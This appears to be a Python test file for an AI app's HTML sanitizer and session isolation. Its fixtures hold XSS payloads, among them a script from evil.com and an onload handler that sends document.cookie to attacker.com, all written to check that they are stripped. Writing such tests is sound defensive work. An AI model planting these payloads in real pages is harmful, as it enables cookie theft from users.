"""
Automated Security Unit Tests
Verifies artifact HTML sanitization, XSS neutralization, CSP tag injection, and session isolation.
"""

import pytest
from httpx import AsyncClient, ASGITransport
from backend.app.main import app
from backend.app.agent.skills.artifact_skill import ArtifactSkill


def test_artifact_xss_sanitization_script_removal():
    skill = ArtifactSkill()
    malicious_html = """
    <div>
      <h1>Growth Matrix</h1>
      <script>alert(document.cookie);</script>
      <script src="http://evil.com/xss.js"></script>
      <p>Safe content</p>
    </div>
    """
    sanitized = skill.sanitize_html(malicious_html)

    # Verify <script> tags are completely stripped
    assert "<script>" not in sanitized
    assert "alert(document.cookie)" not in sanitized
    assert "xss.js" not in sanitized
    assert "Safe content" in sanitized


def test_artifact_xss_sanitization_event_handlers():
    skill = ArtifactSkill()
    malicious_html = """
    <img src="invalid.jpg" onerror="alert('xss')" onload="fetch('http://attacker.com?cookie=' + document.cookie)">
    <a href="javascript:alert(1)">Click Me</a>
    """
    sanitized = skill.sanitize_html(malicious_html)

    # Verify inline event handlers and javascript: URIs are stripped
    assert "onerror=" not in sanitized
    assert "onload=" not in sanitized
    assert "javascript:" not in sanitized
    assert "Content-Security-Policy" in sanitized


def test_artifact_csp_injection():
    skill = ArtifactSkill()
    plain_html = "<html><head></head><body><h1>Dashboard</h1></body></html>"
    sanitized = skill.sanitize_html(plain_html)

    assert "Content-Security-Policy" in sanitized
    assert "default-src 'none'" in sanitized


@pytest.mark.asyncio
async def test_session_context_isolation_security():
    """Verifies that Session B does not inherit conversation history from Session A."""
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as ac:
        # Create Session A
        res_a = await ac.post("/api/sessions", json={"title": "Session A"})
        session_a_id = res_a.json()["id"]

        # Create Session B
        res_b = await ac.post("/api/sessions", json={"title": "Session B"})
        session_b_id = res_b.json()["id"]

        # Post message to Session A
        await ac.post("/api/chat", json={"session_id": session_a_id, "message": "Secret key for Session A is 12345"})

        # Fetch messages for Session B
        msgs_b_res = await ac.get(f"/api/sessions/{session_b_id}/messages")
        messages_b = msgs_b_res.json()["messages"]

        # Session B must be completely empty and isolated
        assert len(messages_b) == 0
        assert not any("12345" in m["content"] for m in messages_b)
